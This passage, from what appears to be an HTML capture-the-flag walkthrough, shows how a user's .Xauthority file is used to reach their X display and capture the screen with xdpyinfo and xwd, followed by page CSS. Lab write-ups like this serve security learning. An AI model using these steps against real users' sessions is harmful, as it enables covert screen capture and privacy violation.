+<p>With the file “.Xauthority” in our current user, we run the previous
+command again and …</p>
+<pre><code>xdpyinfo -display :0
+name of display:    :0
+version number:    11.0
+vendor string:    The X.Org Foundation
+vendor release number:    12013000
+X.Org version: 1.20.13
+maximum request size:  16777212 bytes
+motion buffer size:  256
+bitmap unit, bit order, padding:    32, LSBFirst, 32
+image byte order:    LSBFirst
+...</code></pre>
+<p>Let’s not forget that we have to give value to the variable HOME
+because if not it will not know where the file is.</p>
+<p>We make a capture:</p>
+<div class="sourceCode" id="cb46"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">xwd</span> <span class="at">-root</span> <span class="at">-screen</span> <span class="at">-silent</span> <span class="at">-display</span> :0 <span class="op">&gt;</span> file.xwd</span></code></pre></div>
+<p>We passed it on to our team and:</p>
+<p><img src="images/squashed6.png" /></p>
+</div>
+</body>
+</html>
+
+<style>
+
+html{
+  background-color: #f5f5fa;
+}
+
+body{
+  background-color: white;
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+
+.hidden{
+  display: none
+}
+
+.block{
+  display: block;
+}
+
+h1{
+  font-size: 19pt;
+}
+
+h2{
+  font-size: 16pt;
+}
+
+h3{
+  font-size: 14pt;
+}
+
+.button-class{
+  cursor: pointer;
+  --tw-border-opacity: 1;
+  border-color: rgb(0 0 0 / var(--tw-border-opacity));
+  border-width: 2px;
+  margin-top: 0.5rem;
+  background-color: transparent;
+  background-image: none;
+  font-family: inherit;
+  font-feature-settings: inherit;
+  font-variation-settings: inherit;
+  font-size: 100%;
+  font-weight: inherit;
+  line-height: inherit;
+  color: inherit;
+  --tw-border-spacing-x: 0;
+  --tw-border-spacing-y: 0;
+  --tw-translate-x: 0;
+  --tw-translate-y: 0;
+  --tw-rotate: 0;
+  --tw-skew-x: 0;
+  --tw-skew-y: 0;
+  --tw-scale-x: 1;
+  --tw-scale-y: 1;
+  --tw-pan-x: ;
+  --tw-pan-y: ;
+  --tw-pinch-zoom: ;
+  --tw-scroll-snap-strictness: proximity;
+  --tw-gradient-from-position: ;
+  --tw-gradient-via-position: ;
+  --tw-gradient-to-position: ;
+  --tw-ordinal: ;
+  --tw-slashed-zero: ;
+  --tw-numeric-figure: ;
+  --tw-numeric-spacing: ;
+  --tw-numeric-fraction: ;
+  --tw-ring-inset: ;
+  --tw-ring-offset-width: 0px;
+  --tw-ring-offset-color: #fff;
+  --tw-ring-color: rgb(59 130 246 / 0.5);
+  --tw-ring-offset-shadow: 0 0 #0000;
+  --tw-ring-shadow: 0 0 #0000;
+  --tw-shadow: 0 0 #0000;
+  --tw-shadow-colored: 0 0 #0000;
+  --tw-blur: ;
+  --tw-brightness: ;
+  --tw-contrast: ;
+  --tw-grayscale: ;
+  --tw-hue-rotate: ;
+  --tw-invert: ;
+  --tw-saturate: ;
+  --tw-sepia: ;
+  --tw-drop-shadow: ;
+  --tw-backdrop-blur: ;
+  --tw-backdrop-brightness: ;
+  --tw-backdrop-contrast: ;
+  --tw-backdrop-grayscale: ;
+  --tw-backdrop-hue-rotate: ;
+  --tw-backdrop-invert: ;
+  --tw-backdrop-opacity: ;
+  --tw-backdrop-saturate: ;
+  --tw-backdrop-sepia: ;
+  border-style: solid;
+  box-sizing: border-box;
+  --tw-bg-opacity: 1;
+}
+</style>
